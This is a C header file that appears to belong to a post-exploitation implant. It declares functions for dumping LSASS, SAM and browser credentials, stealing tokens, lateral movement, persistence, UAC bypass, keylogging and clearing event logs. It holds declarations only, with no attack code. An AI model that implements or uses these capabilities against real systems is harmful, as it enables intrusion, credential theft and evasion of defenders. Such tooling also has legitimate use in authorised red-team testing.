#ifndef JAGER_POSTEX_H
#define JAGER_POSTEX_H

#include <windows.h>

#ifdef __cplusplus
extern "C" {
#endif

// --- Credential Access ---
BOOL cred_dump_sam(PBYTE* output, PDWORD output_size);
BOOL cred_dump_lsass(PBYTE* output, PDWORD output_size);
BOOL cred_dump_credman(PBYTE* output, PDWORD output_size);
BOOL cred_steal_token(DWORD pid, PHANDLE out_token);
BOOL cred_impersonate_token(HANDLE token);
BOOL cred_revert_to_self(void);
BOOL cred_dump_chrome(PBYTE* output, PDWORD output_size);
BOOL cred_dump_browser_dpapi(PBYTE* output, PDWORD output_size);
BOOL cred_dump_tickets(PBYTE* output, PDWORD output_size);
BOOL cred_dump_dpapi_masterkeys(PBYTE* output, PDWORD output_size);

// --- Token Operations ---
BOOL token_steal(DWORD pid);
BOOL token_make(const char* domain, const char* username, const char* password);
BOOL token_revert(void);

// --- Discovery ---
BOOL discovery_process_list(PBYTE* output, PDWORD output_size);
BOOL discovery_netstat(PBYTE* output, PDWORD output_size);
BOOL discovery_detect_av(PBYTE* output, PDWORD output_size);
BOOL discovery_env_info(PBYTE* output, PDWORD output_size);
BOOL discovery_local_groups(PBYTE* output, PDWORD output_size);

// --- Lateral Movement ---
BOOL lateral_psexec(const char* target, const char* service_name, PBYTE payload, DWORD payload_size);
BOOL lateral_wmi(const char* target, const char* command);
BOOL lateral_winrm(const char* target, const char* command, PBYTE* output, PDWORD output_size);
BOOL lateral_dcom(const char* target, const char* command);

// --- Persistence ---
BOOL persist_registry_run(const char* name, const char* path);
BOOL persist_scheduled_task(const char* name, const char* path, const char* trigger);
BOOL persist_service(const char* name, const char* display, const char* binary_path);
BOOL persist_wmi_event(const char* name, const char* command, int interval_sec);
BOOL persist_startup_folder(const char* filename, PBYTE payload, DWORD payload_size);
BOOL persist_dll_hijack(const char* target_exe, const char* dll_name, PBYTE dll_payload, DWORD dll_size);
BOOL persist_com_hijack(const char* clsid, const char* dll_path);

// --- Privilege Escalation ---
BOOL privesc_named_pipe(const char* pipe_name);
BOOL privesc_token_dup(void);
BOOL privesc_potato(void);
BOOL privesc_uac_bypass(const char* payload_path);
BOOL privesc_print_spooler(const char* dll_path);

// --- Collection ---
BOOL collect_clipboard(PBYTE* output, PDWORD output_size);
BOOL collect_screenshot(PBYTE* output, PDWORD output_size);
BOOL collect_keylog_start(void);
BOOL collect_keylog_stop(PBYTE* output, PDWORD output_size);
BOOL collect_file_download(const char* remote_path, PBYTE* output, PDWORD output_size);
BOOL collect_file_upload(const char* remote_path, PBYTE data, DWORD data_size);
BOOL collect_directory_list(const char* path, PBYTE* output, PDWORD output_size);

// --- File Operations ---
BOOL file_ls(const char* path, PBYTE* output, PDWORD output_size);
BOOL file_cat(const char* path, PBYTE* output, PDWORD output_size);
BOOL file_rm(const char* path);
BOOL file_mkdir(const char* path);
BOOL file_mv(const char* src, const char* dst);
BOOL file_cp(const char* src, const char* dst);
BOOL file_pwd(PBYTE* output, PDWORD output_size);
BOOL file_cd(const char* path);

// --- Execution ---
BOOL exec_shell(const char* command, PBYTE* output, PDWORD output_size);
BOOL exec_powershell(const char* script, PBYTE* output, PDWORD output_size);
BOOL exec_assembly(PBYTE assembly, DWORD assembly_size, const char* args, PBYTE* output, PDWORD output_size);
BOOL exec_bof(PBYTE bof_data, DWORD bof_size, const char* args, PBYTE* output, PDWORD output_size);

// --- Network ---
BOOL net_port_scan(const char* target, PWORD ports, int port_count, PBYTE* output, PDWORD output_size);
BOOL net_arp_scan(const char* subnet, PBYTE* output, PDWORD output_size);

// --- Defense Evasion ---
BOOL defense_timestomp(const char* path, FILETIME* create, FILETIME* modify, FILETIME* access);
BOOL defense_clear_eventlog(const char* log_name);

// --- Auto-Enumeration (first beacon) ---
char *auto_enum_run(void);
const char *auto_enum_peek(void);
void auto_enum_release(void);
int auto_enum_detect_av(char *out, int max_out);
int auto_enum_integrity(char *out, int max_out);

#ifdef __cplusplus
}
#endif

#endif // JAGER_POSTEX_H
